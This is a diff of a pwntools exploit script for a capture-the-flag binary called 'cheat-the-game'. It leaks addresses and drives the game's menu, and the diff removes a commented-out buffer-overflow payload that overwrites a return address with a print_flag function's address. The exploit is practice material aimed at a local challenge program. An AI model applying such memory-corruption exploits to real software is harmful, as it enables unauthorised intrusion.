@@ -1,12 +1,12 @@
+# This code works, June 5th 2024
+
 from pwn import *
 
 # context.log_level = 'debug'
-
-p = process('./cheat-the-game/cheat-the-game')
-# p = process('./cheat-the-game')
+p = process('./cheat-the-game')
 
 
-def solve(addr):
+def solve(addr=0x0):
     p.recvuntil(b'>>>')
     p.sendline(b'3')
 
@@ -35,23 +35,6 @@ potion_addr = int(p.recvline(), 16)
 p.recvuntil(b'>>>')
 p.sendline(b'2')
 
-
-'''
-p.recvuntil(b'>>>')
-p.sendline(b'3')
-
-p.recvuntil(b':')
-p.recvline()
-
-payload = b'A' * 16
-payload += print_flag_addr.to_bytes(8, 'little')
-
-p.sendline(payload)
-
-p.recvuntil(b'>>>')
-p.sendline(b'2')
-'''
-
 for i in range(5):
     solve(incStr_addr)
     solve(intInt_addr)
@@ -59,15 +42,4 @@ for i in range(5):
 p.recvuntil(b'>>>')
 p.sendline(b'5')
 
-flag = b'Mission fail :('
-# msg = p.recvline()
-flag = p.recvline()
-
-# if p.recvline()[0:16] == b'Congratulations':
-# flag = p.recvline()
-
-p.recvuntil(b'>>>')
-# p.sendline(b'q')
-
 p.interactive()
-print(flag)
